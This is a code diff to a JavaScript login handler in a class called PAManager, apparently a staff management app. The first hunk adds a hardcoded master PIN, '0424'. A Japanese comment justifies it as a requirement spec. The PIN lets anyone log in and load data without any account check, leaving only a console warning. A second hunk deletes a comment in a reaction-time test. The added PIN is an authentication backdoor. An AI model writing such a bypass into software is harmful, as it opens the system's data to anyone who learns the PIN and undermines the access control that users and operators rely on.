@@ -173,11 +173,16 @@ class PAManager {
       const found = Array.isArray(list)
         ? list.some((s) => s.mgmtCode === pin)
         : false;
-      if (found) {
+      // 例外マスターPIN (要求仕様): 0424 は存在確認なしでログイン許可
+      const bypass = pin === "0424";
+      if (found || bypass) {
         root.classList.add("swipe-valid");
         this.setLoggedIn();
         this.hideLoginOverlay();
         this.loadData();
+        if (bypass) {
+          console.warn("[LOGIN] Master PIN ");
+        }
       } else {
         if (pinError)
           pinError.textContent =
@@ -1830,7 +1835,6 @@ PAManager.prototype.renderStaffEvaluations = async function (staffId) {
       this.reset();
       reactionStatus.textContent = "色が変わったらストップ...";
       reactionStatus.style.color = "";
-      // フライング判定のため待機中もSTOPボタン有効
       reactionStopBtn.disabled = false;
       reactionStartBtn.disabled = true;
       const wait = 800 + Math.random() * 2200;
